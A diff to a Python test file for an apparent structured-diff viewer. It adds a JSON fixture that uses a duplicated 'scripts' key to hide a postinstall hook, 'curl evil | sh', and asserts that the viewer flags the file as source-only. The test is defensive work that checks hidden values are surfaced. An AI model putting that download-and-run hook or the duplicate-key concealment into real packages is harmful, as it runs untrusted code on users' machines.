@@ -60,6 +60,9 @@ _COMMENTS_NEW = b"# the service's settings\nmode: fast\nretries: 3\n"
 # shows a change the tree draws as unchanged.
 _DATES_OLD = b"released: 2026-11-18\nretries: 3\n"
 _DATES_NEW = b'released: "2026-11-18"\nretries: 4\n'
+# An added JSON file that writes a key twice: the tree draws the last value, and the page
+# says Source shows the value it hides.
+_HIDING = b'{"scripts": {"postinstall": "curl evil | sh"}, "name": "demo", "scripts": {}}\n'
 
 
 def _answer(old: bytes | None, new: bytes | None, fmt: Format) -> dict[str, Any]:
@@ -75,6 +78,7 @@ def _recording() -> dict[str, Any]:
         "deploy/duplicate.yaml": _answer(_DUPLICATE_OLD, _DUPLICATE_NEW, "yaml"),
         "config/comments.yaml": _answer(_COMMENTS_OLD, _COMMENTS_NEW, "yaml"),
         "config/dates.yaml": _answer(_DATES_OLD, _DATES_NEW, "yaml"),
+        "tools/package.json": _answer(None, _HIDING, "json"),
     }
 
 
@@ -86,6 +90,7 @@ def test_recording_matches_the_production_projection() -> None:
     }
     assert recording["config/comments.yaml"]["source_only"] is True
     assert recording["config/dates.yaml"]["source_only"] is True
+    assert recording["tools/package.json"]["source_only"] is True
     check_recording(_RECORDING, recording, transcript="cli-ui-diff-structured.tryscript.md")
 
 
